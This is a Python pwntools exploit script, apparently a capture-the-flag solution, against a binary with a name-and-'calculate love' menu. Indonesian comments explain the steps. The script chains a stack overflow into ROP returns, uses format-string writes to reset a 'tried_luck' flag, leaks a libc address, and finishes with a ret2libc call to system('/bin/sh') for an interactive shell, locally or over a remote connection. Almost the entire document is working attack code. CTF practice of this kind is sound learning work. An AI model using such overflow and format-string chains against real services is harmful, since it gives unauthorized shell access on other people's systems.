from pwn import *
import sys

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def enter_name(self, name):
        p = self.p
        p.sendlineafter(b"Please enter your name: ", name)

    def calculate_love(self, lucky_name):
        p = self.p
        p.sendlineafter(b"Please choose what you would like to do: ", b"2")
        p.sendlineafter(b"Enter the name of the lucky one ;): ", lucky_name)

    def you_cant_see_me(self, name):
        p = self.p
        p.sendlineafter(b"are you?", name)

    def exploit(self):
        p = self.p
        self.enter_name(b"dimas")
        """
        disini kita return ke fungsi you_cant_see_me 2x.
        rencananya:
        return yang pertama kita akan membuat formatstring agar variable tried_luck nilainya menjadi false lagi
        return yang kedua kita me-leak address dari libc
        """
        rp = ROP(exe)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            exe.sym['you_cant_see_me'],
            exe.sym['you_cant_see_me'],
            exe.sym['main'],

        )
        self.calculate_love(pay)
        
        """
        kita rubah variable tried_luck agar nilainya menjadi false lagi
        """
        self.you_cant_see_me(fmtstr_payload(6, {exe.sym['tried_luck']: 0}))
        """
        lalu kita manfaatkan format string lagi agar dapat meleak address dari libc
        """
        self.you_cant_see_me(b"%2$lX")
        p.recvuntil(b"Nice name it 1s: ")
        libc_leak = eval(b"0x"+p.recvline().strip())
        libc.address = libc_leak - 0x3c6780
        log.info(f"{libc.address=:x}")
        """
        Setelah itu kita tinggal melakukan ret2libc
        """
        rp = ROP(libc)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            next(libc.search(b'/bin/sh')),
            libc.sym['system']
        )
        self.enter_name(b"dimas")
        self.calculate_love(pay)
        p.interactive()


if __name__ == "__main__":
    x, p = init()
    x.debug('break *analyze_name\nc\nc')
    x.exploit()
